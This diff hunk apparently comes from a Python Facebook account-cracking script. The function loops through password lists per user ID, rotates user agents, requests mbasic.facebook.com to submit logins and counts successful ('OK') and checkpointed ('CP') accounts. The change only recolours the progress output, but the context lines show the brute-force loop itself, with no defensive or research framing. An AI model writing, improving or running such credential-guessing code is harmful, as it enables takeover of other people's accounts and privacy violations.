@@ -164,7 +164,7 @@ def DEVHIS2(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write(f'\r\033[1;92m[RUNNING]▶ [%s/%s]  [OK-%s] ~ [CP-%s] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write(f'\r\033[1;92m[RUNNING]▶ [\033[1;37m%s/%s\033[0m\033[1;32m]  [OK-%s] ~ [CP-%s] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
